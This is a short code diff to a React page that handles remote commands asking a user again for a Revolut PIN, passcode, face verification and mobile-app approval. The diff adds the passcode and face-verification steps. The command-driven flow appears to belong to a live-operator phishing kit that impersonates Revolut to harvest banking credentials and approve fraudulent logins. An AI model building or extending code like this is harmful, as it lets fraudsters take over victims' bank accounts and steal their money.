@@ -51,9 +51,19 @@ export default function PinPage() {
     // Updated command handling for PIN
     useEffect(() => {
         if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
-            displayErrorModal('pin');
+            console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
+            displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
-            navigateWithLoader('/VerificationPage');
+            navigateWithLoader('/PasscodePage');
+        } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
+            console.log("HERE WE WILL REQUEST REVOLUT PIN");
+            displayErrorModal('passcode'); // Show error modal for pin
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
+            navigateWithLoader('/FaceVerificationPage');
+        } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
+            // displayErrorModal('face_verification'); // Show error modal for face verification
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            displayAuthModal()
         } else if (command === 'FINISH') {
             navigateWithLoader('/verificationPage');
         }
